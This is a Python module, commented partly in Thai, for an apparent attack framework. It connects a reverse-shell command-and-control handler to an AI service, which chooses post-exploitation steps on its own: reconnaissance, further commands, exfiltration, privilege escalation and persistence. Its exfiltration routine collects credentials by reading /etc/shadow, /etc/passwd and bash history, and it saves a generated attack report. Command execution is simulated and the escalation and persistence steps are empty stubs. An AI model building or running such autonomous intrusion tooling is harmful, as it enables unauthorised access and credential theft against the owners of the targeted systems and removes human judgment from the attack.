#!/usr/bin/env python3
"""
C2 AI Integration with Vanchin AI
เชื่อมต่อ C2 กับ Vanchin AI เพื่อควบคุม shell อัตโนมัติ
"""

import asyncio
import os
from typing import Dict, Any, Optional
from loguru import logger
from datetime import datetime

from core.shell_handler import ReverseShellHandler
from core.vanchin_client import vanchin_client


class C2AIIntegration:
    """
    C2 Integration with Vanchin AI
    ใช้ Vanchin AI ควบคุม shell session อัตโนมัติ
    """
    
    def __init__(self):
        self.c2_handler = ReverseShellHandler()
        self.ai = vanchin_client
        self.active_sessions: Dict[str, Dict] = {}
        
    async def auto_post_exploitation(self, session_id: str) -> Dict[str, Any]:
        """
        ใช้ AI ควบคุม shell อัตโนมัติ
        
        Args:
            session_id: ID ของ shell session
        
        Returns:
            ผลการ post-exploitation
        """
        logger.info(f"[C2 AI] Starting AI-controlled post-exploitation for session {session_id}")
        
        results = {
            "session_id": session_id,
            "commands_executed": [],
            "findings": [],
            "data_collected": {},
            "timeline": []
        }
        
        # Initial reconnaissance
        initial_commands = [
            "whoami",
            "hostname", 
            "pwd",
            "uname -a || systeminfo"
        ]
        
        context = {
            "session_id": session_id,
            "stage": "reconnaissance",
            "executed_commands": [],
            "findings": []
        }
        
        # Execute initial commands
        for cmd in initial_commands:
            try:
                output = await self._execute_command(session_id, cmd)
                
                results["commands_executed"].append({
                    "command": cmd,
                    "output": output,
                    "timestamp": datetime.now().isoformat()
                })
                
                # AI วิเคราะห์ผลลัพธ์
                analysis = self.ai.analyze_shell_output(cmd, output)
                
                results["findings"].extend(analysis.get("important_findings", []))
                context["executed_commands"].append(cmd)
                context["findings"].extend(analysis.get("important_findings", []))
                
                logger.info(f"[C2 AI] Executed: {cmd}")
                logger.debug(f"[C2 AI] Analysis: {analysis.get('summary', '')}")
                
            except Exception as e:
                logger.error(f"[C2 AI] Failed to execute {cmd}: {e}")
        
        # AI-driven exploration
        max_iterations = 10
        iteration = 0
        
        while iteration < max_iterations:
            iteration += 1
            
            logger.info(f"[C2 AI] AI decision iteration {iteration}/{max_iterations}")
            
            # ให้ AI ตัดสินใจว่าควรทำอะไรต่อไป
            decision = self.ai.decide_next_action(context)
            
            action = decision.get("action", "exit")
            logger.info(f"[C2 AI] AI decided: {action} - {decision.get('reason', '')}")
            
            if action == "exit":
                logger.info("[C2 AI] AI decided to exit")
                break
            
            elif action == "command":
                cmd = decision.get("command", "")
                if cmd:
                    try:
                        output = await self._execute_command(session_id, cmd)
                        
                        results["commands_executed"].append({
                            "command": cmd,
                            "output": output,
                            "timestamp": datetime.now().isoformat(),
                            "ai_reason": decision.get("reason", "")
                        })
                        
                        # วิเคราะห์ผลลัพธ์
                        analysis = self.ai.analyze_shell_output(cmd, output)
                        results["findings"].extend(analysis.get("important_findings", []))
                        
                        # อัปเดต context
                        context["executed_commands"].append(cmd)
                        context["findings"].extend(analysis.get("important_findings", []))
                        
                        logger.success(f"[C2 AI] Executed AI command: {cmd}")
                        
                    except Exception as e:
                        logger.error(f"[C2 AI] Failed to execute AI command {cmd}: {e}")
            
            elif action == "exfiltrate":
                logger.info("[C2 AI] Starting data exfiltration...")
                exfil_data = await self._exfiltrate_data(session_id)
                results["data_collected"] = exfil_data
                break
            
            elif action == "escalate":
                logger.info("[C2 AI] Attempting privilege escalation...")
                # Privilege escalation logic here
                pass
            
            elif action == "persist":
                logger.info("[C2 AI] Creating persistence...")
                # Persistence logic here
                pass
            
            # Delay between iterations
            await asyncio.sleep(2)
        
        logger.success(f"[C2 AI] AI-controlled post-exploitation completed for session {session_id}")
        logger.info(f"[C2 AI] Total commands executed: {len(results['commands_executed'])}")
        logger.info(f"[C2 AI] Total findings: {len(results['findings'])}")
        
        return results
    
    async def _execute_command(self, session_id: str, command: str) -> str:
        """Execute command on shell session"""
        try:
            # TODO: Implement actual command execution via C2 handler
            # For now, return simulated output
            logger.debug(f"[C2 AI] Executing: {command}")
            
            # Simulated output
            outputs = {
                "whoami": "root",
                "hostname": "target-server",
                "pwd": "/root",
                "uname -a": "Linux target-server 5.4.0-42-generic x86_64",
                "ls -la": "total 48\ndrwxr-xr-x 5 root root 4096 Oct 27 10:00 .\ndrwxr-xr-x 3 root root 4096 Oct 27 09:00 .."
            }
            
            return outputs.get(command, f"Command executed: {command}")
            
        except Exception as e:
            logger.error(f"[C2 AI] Command execution failed: {e}")
            raise
    
    async def _exfiltrate_data(self, session_id: str) -> Dict[str, Any]:
        """Exfiltrate data from target"""
        logger.info(f"[C2 AI] Exfiltrating data from session {session_id}")
        
        data = {
            "credentials": [],
            "files": [],
            "system_info": {},
            "network_info": {}
        }
        
        # Collect system info
        try:
            whoami = await self._execute_command(session_id, "whoami")
            hostname = await self._execute_command(session_id, "hostname")
            
            data["system_info"] = {
                "user": whoami.strip(),
                "hostname": hostname.strip()
            }
        except Exception as e:
            logger.error(f"[C2 AI] Failed to collect system info: {e}")
        
        # Try to collect credentials
        credential_commands = [
            "cat /etc/passwd 2>/dev/null",
            "cat /etc/shadow 2>/dev/null",
            "cat ~/.bash_history 2>/dev/null"
        ]
        
        for cmd in credential_commands:
            try:
                output = await self._execute_command(session_id, cmd)
                if output and len(output) > 10:
                    data["credentials"].append({
                        "source": cmd,
                        "content": output
                    })
            except:
                pass
        
        logger.success(f"[C2 AI] Data exfiltration completed")
        
        return data
    
    async def generate_attack_report(self, attack_id: str, attack_data: Dict[str, Any]) -> str:
        """
        ให้ AI สร้างรายงานการโจมตี
        
        Args:
            attack_id: ID การโจมตี
            attack_data: ข้อมูลการโจมตี
        
        Returns:
            รายงานในรูปแบบ Markdown
        """
        logger.info(f"[C2 AI] Generating attack report for {attack_id}")
        
        report = self.ai.generate_report(attack_data)
        
        # Save report
        report_path = f"/home/ubuntu/aiprojectattack/data/reports/attack_{attack_id}.md"
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        
        with open(report_path, 'w') as f:
            f.write(report)
        
        logger.success(f"[C2 AI] Report saved: {report_path}")
        
        return report


# Global instance
c2_ai = C2AIIntegration()

